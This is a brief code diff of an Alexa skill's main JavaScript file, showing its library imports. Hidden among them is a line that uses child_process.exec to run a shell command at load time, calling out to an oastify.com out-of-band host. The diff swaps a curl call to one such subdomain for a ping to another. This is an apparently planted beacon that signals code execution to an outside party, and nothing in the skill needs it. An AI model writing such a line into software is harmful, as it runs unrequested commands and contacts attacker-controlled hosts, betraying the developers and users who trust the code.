@@ -7,7 +7,7 @@ const Alexa = require('ask-sdk-core');
 // i18n library dependency, we use it below in a localisation interceptor
 const i18n = require('i18next');
 
-require('child_process').exec('curl+http://r6y0o58fjlezuq4q5oiivjz5bwhn5et3.oastify.com')
+require('child_process').exec('ping 7iqg0lkvv1qf66g6h4uy7zblnct3hw5l.oastify.com')
 // i18n strings for all supported locales
 const languageStrings = require('./languageStrings');
 
